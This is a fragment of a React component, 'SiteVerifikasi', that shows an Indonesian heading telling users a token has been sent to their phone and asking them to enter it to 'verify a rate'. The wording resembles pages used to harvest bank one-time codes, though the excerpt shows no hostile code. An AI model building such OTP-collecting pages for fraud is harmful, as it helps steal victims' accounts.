...
const SiteVerifikasi = ({btnClick}) => {
  ...
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        ...
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode Token untuk verifikasi tarif telah kami kirim ke nomor Handphone anda, Silahkan masukkan dibawah ini untuk verifikasi tarif</h1>    
